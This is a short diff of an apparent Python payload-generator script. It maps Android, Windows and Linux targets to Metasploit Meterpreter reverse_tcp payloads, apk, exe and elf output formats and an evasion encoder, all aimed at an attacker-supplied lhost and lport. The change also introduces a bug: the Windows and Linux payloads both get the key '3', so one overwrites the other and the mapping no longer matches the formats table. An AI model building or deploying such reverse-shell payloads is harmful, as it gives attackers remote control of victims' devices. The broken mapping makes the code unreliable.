@@ -5,15 +5,15 @@ def generate_payload(platform, lhost, lport, outfile):
     encoder = input("Encoder (e.g., x86/shikata_ga_nai): ").strip()
 
     payloads = {
-        "android": "android/meterpreter/reverse_tcp",
-        "windows": "windows/meterpreter/reverse_tcp",
-        "linux": "linux/x86/meterpreter/reverse_tcp"
+        "1": "android/meterpreter/reverse_tcp",
+        "3": "windows/meterpreter/reverse_tcp",
+        "3": "linux/x86/meterpreter/reverse_tcp"
     }
 
     formats = {
-        "android": "apk",
-        "windows": "exe",
-        "linux": "elf"
+        "1": "apk",
+        "2": "exe",
+        "3": "elf"
     }
 
     payload = payloads.get(platform, "windows/meterpreter/reverse_tcp")
